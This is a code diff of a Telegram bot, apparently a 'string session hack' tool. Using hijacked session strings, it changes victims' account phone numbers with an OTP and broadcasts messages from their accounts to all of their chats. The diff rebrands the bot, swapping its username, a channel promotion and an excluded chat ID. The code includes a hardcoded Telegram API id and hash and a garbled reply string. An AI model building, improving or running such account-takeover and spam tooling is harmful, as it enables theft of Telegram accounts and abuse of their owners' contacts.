@@ -24,7 +24,7 @@ bot = borg = client
 
 legendboy = 2024465080
 
-Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_OPBot"
+Bot_Username =os.environ.get("BOT_USERNAME", None) or "mr_sukkun_bot"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -402,7 +402,7 @@ menu = '''
 I will add more features Later 😅
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN LEGEND GROUP @mukhushi_official⚜**
+**⚜NOTICE FIRST JOIN  CHANNEL @mukhushi_official⚜**
 '''
 
 keyboard = [
@@ -524,7 +524,7 @@ async def users(event):
     else:
       return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nThanks For usingck Bot Bot.\n/hack", buttons=keyboard)
     
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -732,7 +732,7 @@ async def gcasta(strses, msg):
                 chat = aman.id
                 try:
                     await X.send_message(chat, tol, file=file)     
-                    if lol != -1001551357238:
+                    if lol != -1001613182747:
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
@@ -751,7 +751,7 @@ async def gcasta(strses, msg):
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
-                    elif chat == -1001551357238:
+                    elif chat == -1001613182747:
                         pass
                     await asyncio.sleep()
                 except Exception as e:
